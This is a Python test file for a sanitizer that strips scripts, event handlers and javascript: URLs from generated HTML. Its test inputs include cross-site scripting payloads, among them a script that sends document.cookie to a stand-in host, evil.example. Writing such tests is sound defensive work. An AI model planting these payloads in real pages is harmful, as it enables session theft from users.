"""
HTML artifact sanitizer (app/skills/html_artifact.py). No DB, no network --
this is pure string processing, and it is the backend half of the "generated
HTML is untrusted" security requirement (the other half is the frontend's
iframe sandboxing -- see docs/architecture.md).
"""

from app.skills.html_artifact import sanitize_html


def test_strips_script_tags():
    html = "<html><body><script>alert('xss')</script><p>hi</p></body></html>"
    out = sanitize_html(html)
    assert "<script" not in out.lower()
    assert "<p>hi</p>" in out


def test_strips_self_closing_script_tags():
    html = '<html><body><script src="evil.js"/><p>hi</p></body></html>'
    out = sanitize_html(html)
    assert "<script" not in out.lower()


def test_strips_inline_event_handlers():
    html = '<button onclick="doBad()">go</button><img onerror=\'doBad()\' src="x">'
    out = sanitize_html(html)
    assert "onclick" not in out.lower()
    assert "onerror" not in out.lower()
    assert "<button>go</button>" in out


def test_neutralizes_javascript_urls():
    html = '<a href="javascript:alert(1)">click</a>'
    out = sanitize_html(html)
    assert "javascript:" not in out.lower()
    assert 'href="#"' in out


def test_strips_markdown_code_fences_if_model_added_them():
    html = "```html\n<html><body><p>hi</p></body></html>\n```"
    out = sanitize_html(html)
    assert "```" not in out
    assert out.startswith("<html>")


def test_leaves_ordinary_markup_and_inline_css_alone():
    html = (
        "<html><head><style>body{color:#222}</style></head>"
        "<body><h1>Title</h1><p>Some <strong>bold</strong> text.</p></body></html>"
    )
    out = sanitize_html(html)
    assert out == html.strip()


def test_combined_payload_is_fully_neutralized():
    payload = """<html><head><style>body{color:red}</style></head>
<body onload="steal()">
<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
<a href="javascript:alert(document.cookie)">click me</a>
<button onclick="doBad()">go</button>
<p>Legitimate content</p>
</body></html>"""
    out = sanitize_html(payload)
    lowered = out.lower()
    assert "<script" not in lowered
    assert "onload" not in lowered
    assert "onclick" not in lowered
    assert "javascript:" not in lowered
    assert "Legitimate content" in out
